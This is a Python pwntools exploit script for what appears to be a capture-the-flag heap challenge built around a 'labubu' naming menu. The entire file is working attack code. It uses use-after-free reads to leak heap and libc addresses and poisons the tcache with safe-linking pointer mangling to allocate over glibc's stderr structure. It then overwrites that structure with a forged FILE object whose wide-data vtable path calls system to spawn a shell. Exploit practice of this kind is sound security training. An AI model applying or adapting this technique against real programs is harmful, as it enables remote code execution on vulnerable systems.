from pwn import *

context.binary = elf = ELF("./chal_patched")
context.arch = "amd64"
# context.log_level = "debug"

gdbscript = "b main"

# host = "localhost" #change host and port as needed
# port = 5000
p = process()
# p = remote(host, port)
gdb.attach(p)
sleep(2)

def s(): #just cos i have some buffering issues with pwntools not needed
    sleep(0.02)

def alloc(index):
    s()
    p.sendlineafter(b"> ", b"1")
    s()
    p.sendlineafter(b"idx?: > ", str(index).encode())
    s()

def free(index):
    s()
    p.sendlineafter(b"> ", b"4")
    s()
    p.sendlineafter(b"> ", str(index).encode())
    s()

def edit(index, name):
    s()
    p.sendlineafter(b"> ", b"2")
    s()
    p.sendlineafter(b"> ", str(index).encode())
    s()
    if isinstance(name, str) == False:
        p.sendlineafter(b"Name your labubu\n", name)
    else:
        p.sendlineafter(b"Name your labubu\n", str(name).encode())
    s()

def read(index):
    s()
    p.sendlineafter(b"> ", b"3")
    s()
    p.sendlineafter(b"> ", str(index).encode())
    s()

def mangle(key, target):
    return key ^ target

alloc(0)
free(0)
read(0)
heapleak = p.recvuntil(b"Welcome", drop=True)[:6]
heapleak = u64(heapleak.ljust(8, b"\x00"))
print(f"This is heap leak: {hex(heapleak)}")

for i in range(0, 9):
    # print(f"alloc at {i}")
    alloc(i)

for i in range(0, 7):
    # print(f"free at {i}")
    free(i)

free(7)
read(7)
libcleak = p.recvuntil(b"Welcome", drop=True)[:6]
libcleak = u64(libcleak.ljust(8, b"\x00"))
print(f"This is main_arena+96: {hex(libcleak)}")
main_arena_offset = 0x210ac0 + 96 #rmb to change this to the specific libc of the container
base = libcleak - main_arena_offset
print(f"This is libc base: {hex(base)}")
stderr = base + 0x00000000002114e0 # this is the _IO_2_1_stderr_@@GLIBC_2.2.5  rmb to change    
print(f"This is stderr struct: {hex(stderr)}")

#tcache poison time
edit(2, p64(mangle(heapleak, stderr)))
alloc(13)
alloc(14)
alloc(15)
alloc(0)
alloc(1)
alloc(3)
read(3) #this is the stderr struct

system = base + 0x000000000005c110 #rmb to change offset to the actual libc in env  
io_wfile_jumps = base + 0x000000000020f1c8 # rmb to change
fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stderr-0x10 # Should be null
fs.chain = system
fs._codecvt = stderr
# stderr becomes it's own wide data vtable
# Offset is so that system (fs.chain) is called
fs._wide_data = stderr - 0x48
fs.vtable = io_wfile_jumps

edit(3, bytes(fs))
p.sendline(b"5")
p.interactive()
